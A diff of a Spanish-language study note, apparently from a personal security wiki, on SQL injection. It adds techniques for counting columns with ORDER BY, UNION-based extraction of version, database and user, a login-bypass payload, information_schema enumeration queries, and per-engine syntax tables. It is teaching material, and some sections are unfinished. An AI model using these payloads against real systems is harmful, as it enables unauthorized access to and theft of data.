@@ -19,65 +19,117 @@ SELECT * FROM users WHERE username = '$username' AND password = '$password';
 
 Si el usuario introduce caracteres especiales o consultas SQL, estos serán interpretados por el motor de base de datos.
 
+```SQL
+SELECT * FROM users WHERE username = '$username' AND password = 'INPUT' or 1=1-- -';
+```
+
 -----------
 ## Tipos
 
-- **I
+- **Basada en Error**
+- **Basada en Tiempo**
 
 -----------
 ## ¿Cómo se explota?
 
-1. 
+1. a
+
+## Identificación del número de columnas
+
+En algunos casos es necesario conocer cuántas columnas devuelve la consulta SQL del lado del servidor. Una forma común de descubrirlo es utilizando la cláusula `ORDER BY` con índices numéricos. La técnica consiste en aumentar progresivamente el número utilizado en `ORDER BY`. Mientras el índice corresponda a una columna existente, la consulta será válida. Cuando el índice sea mayor al número de columnas devueltas por la consulta, el servidor generará un error indicando que esa posición no existe.
+
+En este ejemplo sabemos que la consulta devuelve 2 columnas (id y username), aunque en un escenario real únicamente controlaríamos y veriamos el valor del `INPUT`.
+```SQL
+SELECT id,username FROM users WHERE username = 'INPUT';
+```
+
+El payload seria:
+```SQL
+' order by 2;
+```
+
+Lo que el servidor interpretaria correctamente como:
+```SQL
+SELECT id,username FROM users WHERE username = '' order by 2;
+```
+
+Como 2 corresponde a la segunda columna del resultado, la consulta se ejecutará correctamente. 
+
+Sin embargo, si intentamos ordenar por una columna inexistente dara error:
+```SQL
+SELECT id,username FROM users WHERE username = '' order by 3;
+```
+
+## Uso de UNION
+
+Conociendo la cantidad de columnas podemos usar UNION que sirve para concatenar datos en una fila nueva dentro del resultado de la query, por ejemplo:
+```SQL
+SELECT id,username FROM users WHERE username = 'M0xX' union select "test", "prueba";
+```
+
+Gracias a esto se porian usar variables para extraer informacion, de la siguiente manera:
+```SQL
+SELECT id,username FROM users WHERE username = 'M0xX' union select "test", @@version;
+```
+
+Tambien se podria usar:
+* **@@version:** Para conocer la version de la base de datos.
+* **database():** Para conocer la base de datos actualmente en uso.
+* **user():** Para conocer el usuario que esta corriendo la base de datos.
 
 -----------
-## Payloads comunes
+## Payloads
 ### Bypass de Login
 
 ```SQL
 ' OR 1=1--
 ```
-
-### UNION
-
-```SQL
-UNION SELECT NULL,NULL,NULL--
-```
-
-### UNION
+### Listar tablas existentes en la base de datos
 
 ```SQL
-UNION SELECT NULL,NULL,NULL--
+SELECT * FROM information_schema.tables
 ```
+### Listar columnas existentes en la base de datos
+
+```SQL
+SELECT * FROM information_schema.columns
+```
+-----------
+## Sintaxis basado en el motor de base de datos
+
+### String concatenation
+* **Oracle:** `'foo'||'bar'`
+* **Microsoft:** `'foo'+'bar'`
+* **PostgreSQL:** `'foo'||'bar'`
+* **MySQL:** `'foo' 'bar'` espacio entre strings
+* **MySQL Variant:** `CONCAT('foo','bar')`
+### Comments
+* **Oracle:**
+	* `--comment`
+* **Microsoft:**
+	* `--comment`
+	* `/*comment*/`
+* **PostgreSQL:**
+	* `--comment`
+	* `/*comment*/``
+* **MySQL:**
+	* `#comment`
+	* `-- comment`espacio despues del doble dash
+	* `/*comment*/`
+### Database Version
+* **Oracle:** `SELECT banner FROM v$version` o `SELECT version FROM v$instance`
+* **Microsoft:** `SELECT @@version`
+* **PostgreSQL:** `SELECT version()`
+* **MySQL:** `SELECT @@version`
+
+### For More Information
+* [PortSwigger Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 
 -----------
-## Funciones útiles
-
-### MySQL
--
-
-### PostgreSQL
--
-
-### Microsoft SQL Server
--
-
-### Oracle
--
-
------------
-## ¿Donde explotar esta vulnerabilidad?
-
-- Parámetros GET
-- Parámetros POST
-- Cookies
-- Headers HTTP
-
------------
-
-## Herramientas que lo usan
+## Herramientas
 
 - [[SQLMap]]
-- [[Burp Suite]]
+- [[BurpSuite]]
 
 -----------
 ## Prevención
